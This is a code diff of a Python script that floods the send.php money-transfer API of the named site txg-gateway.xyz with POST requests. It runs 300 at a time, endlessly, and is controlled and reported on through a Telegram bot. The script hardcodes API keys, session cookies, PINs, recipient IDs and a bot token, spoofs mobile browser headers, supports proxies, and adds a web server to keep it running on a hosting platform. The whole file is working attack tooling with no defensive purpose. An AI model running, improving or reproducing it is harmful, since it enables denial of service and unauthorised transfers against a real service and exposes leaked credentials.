@@ -1,14 +1,19 @@
 #!/usr/bin/env python3
 """
-Stable API flooder with Telegram bot control – runs on Railway without crashing.
+Stable POST flooder for txg-gateway.xyz with Telegram bot control.
+Uses two API keys via POST requests.
 """
 import asyncio
 import aiohttp
+import json
 import random
 import time
 import signal
 import sys
 import logging
+import os
+from aiohttp import web
+
 from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes
 
@@ -16,29 +21,60 @@ from telegram.ext import Application, CommandHandler, ContextTypes
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# ─── TELEGRAM CONFIG ──────────────────────────────────────
-BOT_TOKEN = "8711419221:AAGx9Rylji34qJeOShWZk0gQkv9YPZ7fXDo"
-ADMIN_ID = 8401097557
+# ─── TELEGRAM CONFIG (env overrides) ────────────────────
+BOT_TOKEN = os.getenv("BOT_TOKEN", "8711419221:AAGx9Rylji34qJeOShWZk0gQkv9YPZ7fXDo")
+ADMIN_ID = int(os.getenv("ADMIN_ID", "8401097557"))
 
-# ─── ATTACK CONFIG ────────────────────────────────────────
-# No {comment} placeholder – use static URLs
-TARGET_APIS = [
-    "https://txg-gateway.xyz/client/api/send.php?api_key=86864a72c5e2f3ad32c1c8f52710959f&secret_pin=123456&toUser=6283146815&amount=1&remark=Txghacked",
-    "https://txg-gateway.xyz/client/api/send.php?api_key=f692ed462bc0976b5332a11944103df7&secret_pin=123456&toUser=9359202967&amount=1&remark=Txghacked"
+# ─── ATTACK CONFIG ──────────────────────────────────────
+# Two API configurations (POST payloads)
+CONFIGS = [
+    {
+        "api_key": "86864a72c5e2f3ad32c1c8f52710959f",
+        "cookie": "api_key=86864a72c5e2f3ad32c1c8f52710959f",
+        "toUser": "6283146815",
+    },
+    {
+        "api_key": "f692ed462bc0976b5332a11944103df7",
+        "cookie": "api_key=f692ed462bc0976b5332a11944103df7",
+        "toUser": "9359202967",
+    },
 ]
 
-CONCURRENT = 300                # Safe for Railway – ~500 concurrent connections
-TOTAL_REQUESTS = 0              # 0 = infinite
+URL = "https://txg-gateway.xyz/client/api/send.php"
+
+BASE_HEADERS = {
+    "Host": "txg-gateway.xyz",
+    "sec-ch-ua-platform": '"Android"',
+    "User-Agent": "Mozilla/5.0 (Linux; Android 16; CPH2729 Build/BP2A.250605.015) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.7922.199 Mobile Safari/537.36",
+    "sec-ch-ua": '"Not=A?Brand";v="99", "Android WebView";v="151", "Chromium";v="151"',
+    "Content-Type": "application/json",
+    "sec-ch-ua-mobile": "?1",
+    "Accept": "*/*",
+    "Origin": "https://txg-gateway.xyz",
+    "X-Requested-With": "inha.gcu.ee",
+    "sec-fetch-site": "same-origin",
+    "sec-fetch-mode": "cors",
+    "sec-fetch-dest": "empty",
+    "Referer": "https://txg-gateway.xyz/dashboard/send.php",
+    "Accept-Encoding": "gzip, deflate",
+    "Accept-Language": "en-IN,en-US;q=0.9,en;q=0.8",
+    "Priority": "u=1, i",
+}
+
+# ─── PERFORMANCE SETTINGS ──────────────────────────────
+CONCURRENT = 300               # parallel requests
+TOTAL_REQUESTS = 0             # 0 = infinite
 USE_PROXIES = False
 PROXY_FILE = "proxies.txt"
 
-# ─── STATS ──────────────────────────────────────────────────
+# ─── GLOBAL STATS ──────────────────────────────────────
 stats = {'sent': 0, 'ok': 0, 'fail': 0}
 lock = asyncio.Lock()
 start_time = time.time()
 flooder_running = True
 flooder_task_obj = None
 
+# ─── PROXY LOADER (optional) ───────────────────────────
 def load_proxies():
     try:
         with open(PROXY_FILE) as f:
@@ -46,12 +82,24 @@ def load_proxies():
     except FileNotFoundError:
         return []
 
-# ─── ASYNC FLOODER ────────────────────────────────────────
-async def fire(session, sem, url, proxy=None):
+# ─── ASYNC REQUEST WORKER ──────────────────────────────
+async def fire(session, sem, config, proxy=None):
     async with sem:
+        headers = {**BASE_HEADERS, "Cookie": config["cookie"]}
+        payload = {
+            "toUser": config["toUser"],
+            "amount": 1,
+            "api_key": config["api_key"],
+            "secret_pin": "1234",
+            "remark": "Ultra pelo",
+            "public": True,
+            "manual": False,
+        }
         try:
-            async with session.get(url, proxy=proxy, ssl=False, timeout=5) as resp:
+            async with session.post(URL, json=payload, headers=headers, proxy=proxy, ssl=False, timeout=5) as resp:
                 status = resp.status
+                # read response to avoid warnings
+                await resp.text()
             async with lock:
                 stats['sent'] += 1
                 if 200 <= status < 400:
@@ -63,6 +111,7 @@ async def fire(session, sem, url, proxy=None):
                 stats['sent'] += 1
                 stats['fail'] += 1
 
+# ─── MAIN FLOODER LOOP ──────────────────────────────────
 async def flooder_loop():
     global flooder_running
     proxies = load_proxies() if USE_PROXIES else []
@@ -71,12 +120,11 @@ async def flooder_loop():
     async with aiohttp.ClientSession(connector=connector) as session:
         tasks = set()
         count = 0
-        logger.info("Flooder started, sending requests...")
+        logger.info("Flooder started, sending POST requests...")
         while flooder_running and (TOTAL_REQUESTS == 0 or count < TOTAL_REQUESTS):
-            # Pick a random API
-            url = random.choice(TARGET_APIS)
+            config = random.choice(CONFIGS)
             proxy = random.choice(proxies) if proxies else None
-            task = asyncio.create_task(fire(session, sem, url, proxy))
+            task = asyncio.create_task(fire(session, sem, config, proxy))
             tasks.add(task)
             count += 1
 
@@ -85,7 +133,7 @@ async def flooder_loop():
                 done, tasks = await asyncio.wait(tasks, timeout=0, return_when=asyncio.FIRST_COMPLETED)
                 tasks = set(tasks)
 
-            # Yield to event loop
+            # Yield control to event loop
             await asyncio.sleep(0)
 
         # Wait for remaining tasks
@@ -93,12 +141,18 @@ async def flooder_loop():
             await asyncio.wait(tasks, timeout=10)
         logger.info("Flooder stopped.")
 
-# ─── TELEGRAM BOT COMMANDS ────────────────────────────────
+# ─── TELEGRAM BOT COMMANDS ──────────────────────────────
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         await update.message.reply_text("⛔ Unauthorized.")
         return
-    await update.message.reply_text(f"✅ Flooder is running.\nUse /status, /stop, /startflood")
+    await update.message.reply_text(
+        "✅ Flooder is active.\n"
+        "Commands:\n"
+        "/status – show live stats\n"
+        "/stop – stop the flood\n"
+        "/startflood – restart flood (resets stats)"
+    )
 
 async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
@@ -125,7 +179,7 @@ async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("🛑 Stopping flooder gracefully...")
 
 async def start_flooder(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global flooder_running, start_time, flooder_task_obj
+    global flooder_running, start_time, flooder_task_obj, stats
     if update.effective_user.id != ADMIN_ID:
         return
     if flooder_running:
@@ -139,7 +193,7 @@ async def start_flooder(update: Update, context: ContextTypes.DEFAULT_TYPE):
     flooder_task_obj = asyncio.create_task(flooder_loop())
     await update.message.reply_text("▶️ Flooder started.")
 
-# ─── PERIODIC REPORT ──────────────────────────────────────
+# ─── PERIODIC AUTO‑REPORT ──────────────────────────────
 async def send_periodic_report(context: ContextTypes.DEFAULT_TYPE):
     if not flooder_running:
         return
@@ -152,13 +206,28 @@ async def send_periodic_report(context: ContextTypes.DEFAULT_TYPE):
            f"⚡ Rate: {rate:.1f} req/s")
     await context.bot.send_message(chat_id=ADMIN_ID, text=msg)
 
+# ─── HEALTH CHECK WEB SERVER (for Railway) ─────────────
+async def health(request):
+    return web.Response(text="Flooder is online", status=200)
+
+async def run_webserver():
+    app = web.Application()
+    app.router.add_get('/', health)
+    runner = web.AppRunner(app)
+    await runner.setup()
+    site = web.TCPSite(runner, host='0.0.0.0', port=int(os.getenv("PORT", "8080")))
+    await site.start()
+    logger.info("Web server started on port %s", os.getenv("PORT", "8080"))
+    # Keep the server running
+    await asyncio.Event().wait()
+
 # ─── MAIN ──────────────────────────────────────────────────
 async def main():
     global flooder_task_obj
-    # Start flooder in background
+    # Start flooder
     flooder_task_obj = asyncio.create_task(flooder_loop())
 
-    # Setup Telegram bot
+    # Start Telegram bot
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start_command))
     app.add_handler(CommandHandler("status", status_command))
@@ -170,17 +239,19 @@ async def main():
         job_queue.run_repeating(send_periodic_report, interval=30, first=10)
 
     # Send startup notification
-    await app.bot.send_message(chat_id=ADMIN_ID, text="🔥 **Flooder online** – running stable.\n/status for stats, /stop to halt.")
+    await app.bot.send_message(chat_id=ADMIN_ID, text="🔥 **Flooder online** – using POST API.\n/status for stats, /stop to halt.")
 
-    # Start polling (blocking)
+    # Start bot polling and web server concurrently
     await app.initialize()
     await app.start()
     await app.updater.start_polling()
 
+    # Run web server alongside
     try:
-        # Keep the bot alive
-        while True:
-            await asyncio.sleep(60)
+        await asyncio.gather(
+            run_webserver(),
+            asyncio.Event().wait()  # keep main alive
+        )
     except asyncio.CancelledError:
         pass
     finally:
